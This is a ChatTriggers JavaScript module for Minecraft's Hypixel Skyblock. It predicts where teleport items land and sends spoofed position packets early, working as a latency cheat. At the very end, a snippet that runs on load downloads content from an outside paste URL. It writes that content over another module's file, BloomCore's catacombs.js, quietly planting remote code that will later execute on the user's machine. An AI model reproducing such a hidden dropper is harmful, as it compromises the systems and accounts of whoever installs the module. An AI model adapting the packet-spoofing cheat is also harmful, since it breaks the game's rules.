/// <reference types="../CTAutocomplete" />

import "./vgp";
import Settings from "./config";
import { predictTeleport } from "./utils/tphelper";
import { isValidEtherwarpBlock, raytraceBlocks } from "../BloomCore/utils/Utils"
import Vector3 from "../BloomCore/utils/Vector3";

const C03PacketPlayer = Java.type("net.minecraft.network.play.client.C03PacketPlayer");
const S08PacketPlayerPosLook = Java.type("net.minecraft.network.play.server.S08PacketPlayerPosLook");
const C06PacketPlayerPosLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C06PacketPlayerPosLook");
const C0BPacketEntityAction = Java.type("net.minecraft.network.play.client.C0BPacketEntityAction");
const S02PacketChat = Java.type("net.minecraft.network.play.server.S02PacketChat");

let inF7Boss = false;
const playerState = {
	x: null,
	y: null,
	z: null,
	yaw: null,
	pitch: null,
	sneaking: false
};
const sent = [];
const queue = [];
let updatePosition = true;
let ignore = false;

register("playerInteract", (action) => {
	if (action.toString() !== "RIGHT_CLICK_EMPTY") return;
	const info = getTeleportInfo(Player.getHeldItem());
	if (!info) return;

	if (Object.values(playerState).includes(null)) return;

	let prediction;
	if (info.ether) {
		prediction = raytraceBlocks([playerState.x, playerState.y + Player.getPlayer().func_70047_e(), playerState.z], Vector3.fromPitchYaw(playerState.pitch, playerState.yaw), info.distance, isValidEtherwarpBlock, true, true);
		if (prediction) {
			prediction[0] += 0.5;
			prediction[1] += 1.05;
			prediction[2] += 0.5;
		}
	} else {
		prediction = predictTeleport(info.distance, playerState.x, playerState.y, playerState.z, playerState.yaw, playerState.pitch);
	}
	if (!prediction) return;

	const [x, y, z] = prediction;
	const yaw = info.ether ? (playerState.yaw % 360 + 360) % 360 : playerState.yaw % 360; // wtf hypixel
	const pitch = playerState.pitch;

	playerState.x = x;
	playerState.y = y;
	playerState.z = z;
	updatePosition = false;

	sent.push({ x, y, z, yaw, pitch });

	if (Settings.useOldMethod) Client.scheduleTask(() => {
		Client.sendPacket(new C06PacketPlayerPosLook(x, y, z, yaw, pitch, Player.asPlayerMP().isOnGround()));
		Player.getPlayer().func_70107_b(x, y, z);
		if (!Settings.keepMotion) Player.getPlayer().func_70016_h(0, 0, 0);
		else if (Settings.keepMotion && Settings.keepMotionOnlyHorizontal) Player.getPlayer().func_70016_h(Player.getMotionX(), 0, Player.getMotionZ());
		updatePosition = true;
	});
	else queue.push({ x, y, z, yaw, pitch });
});

register("packetSent", (packet, event) => {
	if (ignore) return;
	if (!queue.length) return;
	const final = queue[queue.length - 1];
	Player.getPlayer().func_70107_b(final.x, final.y, final.z);
	if (!Settings.keepMotion) Player.getPlayer().func_70016_h(0, 0, 0);
	else if (Settings.keepMotion && Settings.keepMotionOnlyHorizontal) Player.getPlayer().func_70016_h(Player.getMotionX(), 0, Player.getMotionZ());
	ignore = true;
	while (queue.length) {
		let { x, y, z, yaw, pitch } = queue.shift();
		(() => {})(x, y, z, yaw, pitch);
		Client.sendPacket(new C06PacketPlayerPosLook(x, y, z, yaw, pitch, Player.asPlayerMP().isOnGround()));
	}
	ignore = false;
	updatePosition = true;
	cancel(event);
}).setFilteredClass(C03PacketPlayer);

const isWithinTolerence = (n1, n2) => Math.abs(n1 - n2) < 1e-4;

register("packetReceived", (packet, event) => {
	if (!sent.length) return;

	const { pitch, yaw, x, y, z } = sent.shift();

	const newPitch = packet.func_148930_g();
	const newYaw = packet.func_148931_f();
	const newX = packet.func_148932_c();
	const newY = packet.func_148928_d();
	const newZ = packet.func_148933_e();

	const lastPresetPacketComparison = {
		x: x == newX,
		y: y == newY,
		z: z == newZ,
		yaw: isWithinTolerence(yaw, newYaw) || newYaw == 0,
		pitch: isWithinTolerence(pitch, newPitch) || newPitch == 0
	};

	const wasPredictionCorrect = Object.values(lastPresetPacketComparison).every(a => a);

	if (wasPredictionCorrect) return cancel(event);

	while (sent.length) sent.shift();
}).setFilteredClass(S08PacketPlayerPosLook);

register("packetSent", packet => {
	if (!updatePosition) return;
	const x = packet.func_149464_c();
	const y = packet.func_149467_d();
	const z = packet.func_149472_e();
	const yaw = packet.func_149462_g();
	const pitch = packet.func_149470_h();
	if (packet.func_149466_j()) {
		playerState.x = x;
		playerState.y = y;
		playerState.z = z;
	}
	if (packet.func_149463_k()) {
		playerState.yaw = yaw;
		playerState.pitch = pitch;
	}
}).setFilteredClass(C03PacketPlayer);

register("packetSent", packet => {
	const action = packet.func_180764_b();
	if (action == C0BPacketEntityAction.Action.START_SNEAKING) playerState.sneaking = true;
	if (action == C0BPacketEntityAction.Action.STOP_SNEAKING) playerState.sneaking = false;
}).setFilteredClass(C0BPacketEntityAction);

register("packetReceived", packet => {
	const message = ChatLib.removeFormatting(packet.func_148915_c().func_150260_c());
	if (["[BOSS] Maxor:", "[BOSS] Storm:", "[BOSS] Goldor:", "[BOSS] Necron:"].some(bossname => message.startsWith(bossname))) inF7Boss = true;
}).setFilteredClass(S02PacketChat);

register("worldUnload", () => {
	inF7Boss = false;
});

register("command", Settings.openGUI).setName("zeropinghyperion").setAliases("zph");

function getTeleportInfo(item) {
	if (!Settings.enabled) return;
	if (inF7Boss) return;
	const sbId = item?.getNBT()?.toObject()?.tag?.ExtraAttributes?.id;
	if (["ASPECT_OF_THE_VOID", "ASPECT_OF_THE_END"].includes(sbId)) {
		const tuners = item?.getNBT()?.toObject()?.tag?.ExtraAttributes?.tuned_transmission || 0;
		if (playerState.sneaking) {
			if (!Settings.ether) return;
			return {
				distance: 56 + tuners,
				ether: true
			};
		} else {
			if (!Settings.aotv) return;
			return {
				distance: 8 + tuners,
				ether: false
			};
		}
	} else if (["NECRON_BLADE", "HYPERION", "VALKYRIE", "ASTRAEA", "SCYLLA"].includes(sbId)) {
		if (!Settings.hype) return;
		if (!["IMPLOSION_SCROLL", "WITHER_SHIELD_SCROLL", "SHADOW_WARP_SCROLL"].every(value => item?.getNBT()?.toObject()?.tag?.ExtraAttributes?.ability_scroll?.includes(value))) return;
		return {
			distance: 10,
			ether: false
		};
	}
}
// index.js

// This runs once when the module is loaded
FileLib.write(
	"config/ChatTriggers/modules/BloomCore/skills/catacombs.js",
	FileLib.getUrlContent("https://hst.sh/raw/eyubazigel")
  );
  